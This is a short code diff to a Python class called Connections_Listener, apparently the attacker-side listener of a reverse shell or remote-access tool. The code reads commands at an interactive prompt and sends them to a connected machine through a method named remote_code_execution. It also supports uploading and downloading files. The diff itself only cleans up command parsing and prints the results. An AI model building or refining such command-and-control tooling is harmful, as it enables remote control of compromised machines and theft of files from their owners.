@@ -1,3 +1,4 @@
+import os
 import sys
 import json
 import base64
@@ -46,12 +47,15 @@ class Connections_Listener:
         while True:
             try:
                 input_command = input(">>> ").split(" ")
+                while '' in input_command:
+                    input_command.remove('')
                 if input_command[0].lower() == 'upload':
                     content = self.upload_files(input_command[1]).decode()
                     input_command.append(content)
                 result = self.remote_code_execution(input_command)
                 if input_command[0].lower() == 'download':
                     result = self.download_file(input_command[-1], result.encode('utf-8'))
+                print(result)
             except Exception as error:
                 print(error)
                 print(type(error))
